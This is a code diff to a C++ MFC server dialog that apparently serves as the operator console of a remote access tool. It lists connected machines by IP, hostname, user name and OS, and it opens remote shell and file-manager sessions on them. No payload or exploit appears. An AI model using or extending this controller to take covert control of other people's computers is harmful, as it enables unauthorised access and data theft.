@@ -25,7 +25,7 @@ COLUMNSTRUCT m_Column_Data[] =
 	{_T("Comment"),				0.09	},
 };
 // 用于应用程序“关于”菜单项的 CAboutDlg 对话框
-
+CIOCPServer* CSevenServerDlg::m_iocpServer = NULL;
 class CAboutDlg : public CDialogEx
 {
 public:
@@ -78,6 +78,8 @@ BEGIN_MESSAGE_MAP(CSevenServerDlg, CDialogEx)
 	ON_WM_QUERYDRAGICON()
 	ON_WM_SIZE()
 	ON_WM_CONTEXTMENU()
+	ON_COMMAND(ID_LIST_MANAGER, &CSevenServerDlg::OnListManager)
+	ON_COMMAND(ID_LIST_DISCONNECT, &CSevenServerDlg::OnListDisconnect)
 END_MESSAGE_MAP()
 
 
@@ -113,7 +115,8 @@ BOOL CSevenServerDlg::OnInitDialog()
 	SetIcon(m_hIcon, FALSE);		// 设置小图标
 
 	// TODO: 在此添加额外的初始化代码
-	m_Column_Count = 6;
+	m_nComputerNum	=	0;
+	m_Column_Count	=	6;
 	InitListCtrl();
 
 	StartIOCPServer();
@@ -268,8 +271,8 @@ void CSevenServerDlg::ProcessReceiveComplete(ClientContext *pContext)
 	{
 		switch (pContext->m_Dialog[0])
 		{
-		case CLIENT_DLG:
-			((ClientDlg *)dlg)->OnReceiveComplete();
+		case SHELL_DLG:
+			((CCmdDialog *)dlg)->OnReceiveComplete();
 			break;
 		default:
 			break;
@@ -301,6 +304,22 @@ void CSevenServerDlg::ProcessReceiveComplete(ClientContext *pContext)
 			m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));
 		}
 		break;
+	case SHELL_TOKEN_START:
+		{
+			Cmd *CmdInfo;
+			CmdInfo = (Cmd *)pContext->m_DeCompressionBuffer.GetBuffer();
+			((ClientDlg*)(CmdInfo->DialogPointer))->OnReceiveComplete(pContext);
+
+		}
+		break;
+	case FILE_TOKEN_START:
+		{
+			Cmd *CmdInfo;
+			CmdInfo = (Cmd *)pContext->m_DeCompressionBuffer.GetBuffer();
+			((ClientDlg*)(CmdInfo->DialogPointer))->OnReceiveComplete(pContext);
+
+		}
+		break;
 		// 命令停止当前操作
 	default:
 		closesocket(pContext->m_Socket);
@@ -312,7 +331,120 @@ void CSevenServerDlg::OnDisconnect(ClientContext* pContext)
 {
 	return;
 }
-void CSevenServerDlg::AddToList(ClientContext* pContext)
+int CSevenServerDlg::AddToList(ClientContext* pContext)
 {
-	return;
+	LOGININFO*	LoginInfo;
+	if (pContext == NULL)
+		return FALSE;
+	CString	strToolTipsText, strOS;
+	try
+	{
+		int nCnt = m_listCtrl.GetItemCount();
+		// 不合法的数据包
+		if (pContext->m_DeCompressionBuffer.GetBufferLen() != sizeof(LOGININFO))
+			return -1;
+		LoginInfo = (LOGININFO*)pContext->m_DeCompressionBuffer.GetBuffer();
+	//////////////////////////////////////////////////////////////////////////
+		//  Ip  wan/lan 显示
+		// 外网IP
+		sockaddr_in  sockAddr;
+		memset(&sockAddr, 0, sizeof(sockAddr));
+		int nSockAddrLen = sizeof(sockAddr);
+		BOOL bResult = getpeername(pContext->m_Socket,(SOCKADDR*)&sockAddr, &nSockAddrLen);
+
+		CString IPAddress;
+		if (INVALID_SOCKET != bResult)
+			IPAddress = inet_ntoa(sockAddr.sin_addr); 
+		else
+			IPAddress = _T("");
+		int i = m_listCtrl.InsertItem(nCnt, IPAddress);
+		//////////////////////////////////////////////////////////////////////////
+		// 内网IP
+		CString LanIPstr;
+		LanIPstr = inet_ntoa((LoginInfo->IPAddress));
+		m_listCtrl.SetItemText(i, 1, LanIPstr);
+		//////////////////////////////////////////////////////////////////////////
+		// 主机名
+		CString HostNameStr;
+		HostNameStr = LoginInfo->HostName;
+		m_listCtrl.SetItemText(i, 2, HostNameStr);
+		//////////////////////////////////////////////////////////////////////////
+		// 用户名
+		CString UserNameStr;
+		UserNameStr = LoginInfo->UserName;
+		m_listCtrl.SetItemText(i, 3, UserNameStr);
+		//////////////////////////////////////////////////////////////////////////
+		// 系统
+		// 显示输出信息
+		CString pszOS;
+		if (LoginInfo->OsVerInfoEx.dwMajorVersion <= 4 )
+			pszOS = "NT";
+		else if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 0 )
+			pszOS = "Windows 2000";
+		else if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 1 )
+			pszOS = "Windows XP";
+		else if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 2 && (LoginInfo->OsVerInfoEx.wSuiteMask & VER_SUITE_WH_SERVER))
+			pszOS = "Windows Home Server ";
+		else if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 0 && (LoginInfo->OsVerInfoEx.wProductType == VER_NT_WORKSTATION))
+			pszOS = "Windows Vista";  
+		else if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 0 && (LoginInfo->OsVerInfoEx.wProductType != VER_NT_WORKSTATION))
+			pszOS = "Windows Server 2008";  
+		else if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 1 && (LoginInfo->OsVerInfoEx.wProductType == VER_NT_WORKSTATION))
+			pszOS = "Windows 7";  
+		else if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 1 && (LoginInfo->OsVerInfoEx.wProductType != VER_NT_WORKSTATION))
+			pszOS = "Windows Server 2008 R2";  
+		else if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 2 && (LoginInfo->OsVerInfoEx.wProductType == VER_NT_WORKSTATION))
+			pszOS = "Windows 8";  
+		else if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 2 && (LoginInfo->OsVerInfoEx.wProductType != VER_NT_WORKSTATION))
+			pszOS = "Windows Server 2012";  
+		else if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 3 && (LoginInfo->OsVerInfoEx.wProductType == VER_NT_WORKSTATION))
+			pszOS = "Windows 8.1";  
+		else if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 3 && (LoginInfo->OsVerInfoEx.wProductType != VER_NT_WORKSTATION))
+			pszOS = "Windows Server 2012 R2";
+		else
+		{pszOS = "unknown";}
+
+		strOS.Format(
+			_T("%s SP%d (Build %d)"),
+			//OsVerInfo.szCSDVersion,
+			pszOS, 
+			LoginInfo->OsVerInfoEx.wServicePackMajor, 
+			LoginInfo->OsVerInfoEx.dwBuildNumber);
+		m_listCtrl.SetItemText(i, 4, strOS);
+	
+		// 指定唯一标识
+		m_listCtrl.SetItemData(i, (DWORD) pContext);
+	}catch(...){}
+
+	return 0;
+}
+
+
+void CSevenServerDlg::OnListManager()
+{
+	int nItemCount =  m_listCtrl.GetNextItem(-1,LVIS_SELECTED);
+	CString title;
+	title = _T("Client: ");
+	title += m_listCtrl.GetItemText(nItemCount,0);
+	title += _T(" HostName: ") + m_listCtrl.GetItemText(nItemCount,2);
+	ClientDlg * pClientDlg = new ClientDlg;
+	pClientDlg->Create(IDD_CLIENTDLG, GetDesktopWindow());
+	pClientDlg->SetWindowText(title);
+	DWORD dwClientContext = m_listCtrl.GetItemData(nItemCount);
+	pClientDlg->SetIOCPServerAndContext(m_iocpServer,dwClientContext);
+	pClientDlg->SendCmdCommand((int)pClientDlg);
+	pClientDlg->SendFileCommand((int)pClientDlg);
+	pClientDlg->ShowWindow(TRUE);
+	
+	//////////////////////////////////////////////////////////////////////////
+
+	//////////////////////////////////////////////////////////////////////////
+	// TODO: 在此添加命令处理程序代码
+}
+
+
+void CSevenServerDlg::OnListDisconnect()
+{
+
+	// TODO: 在此添加命令处理程序代码
 }
